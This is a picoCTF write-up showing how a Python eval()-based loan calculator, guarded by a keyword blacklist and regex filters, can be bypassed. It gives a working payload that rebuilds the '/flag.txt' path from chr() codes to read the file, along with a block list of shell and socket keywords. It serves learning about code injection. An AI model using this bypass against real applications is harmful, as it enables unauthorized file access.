# Bypassing Regex-Based Security Filters in PicoCTF

In this challenge, we explore how weak input filtering combined with dangerous Python functions like `eval()` can lead to full code execution. The task revolves around a vulnerable loan calculator that attempts to secure user input using keyword blacklisting and regex filters—but it still leaves a door open.

---

## Challenge Overview

* **Category:** Web Exploitation
* **Difficulty:** Intermediate
* **Concepts:** Python `eval()`, regex bypass, code injection

---

## Understanding the Setup

The web app provides a **loan calculator** that processes user input using Python’s `eval()` function. The developers realized this was risky and attempted to lock it down.

### Security Measures Implemented

1. **Keyword Filtering**

   The application blocks known dangerous keywords:

   ```
   os, eval, exec, bind, connect, python, socket, ls, cat, shell
   ```

2. **Regex Filtering**

   A regex is applied to block encoded or suspicious input patterns:

   ```python
   r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\/]|\.\.'
   ```

   This blocks:

   * Hex values like `0x41`
   * Unicode escapes like `\u0041`
   * URL encoding (`%20`, `%2f`)
   * File extensions like `.txt`
   * Path traversal like `../`

At first glance, it seems secure. But with `eval()` still in play, we can get creative.

---

## The Goal

We need to read the contents of `/flag.txt`, but we can’t use slashes, dots, or import libraries. Direct access is blocked:

```python
open('/flag.txt').read()         # Blocked
open('../flag.txt').read()       # Blocked
import os; os.system('cat ...')  # Blocked
```

---

## Bypassing the Filters

The trick is to **dynamically construct the string `/flag.txt`** without using any forbidden characters.

### The Working Payload

```python
open(''.join([chr(x) for x in [47, 102, 108, 97, 103, 46, 116, 120, 116]])).read()
```

### How It Works

* `[47, 102, 108, 97, 103, 46, 116, 120, 116]`: ASCII codes for `/flag.txt`
* `chr(x) for x in [...]`: Converts numbers to characters
* `''.join([...])`: Joins them into a valid file path
* `open(...).read()`: Reads the flag file

Despite all the filters, this payload passes and reveals the flag.

---



![image](https://github.com/user-attachments/assets/3c2d4f87-b683-46b6-95bf-e89b96326ac8)


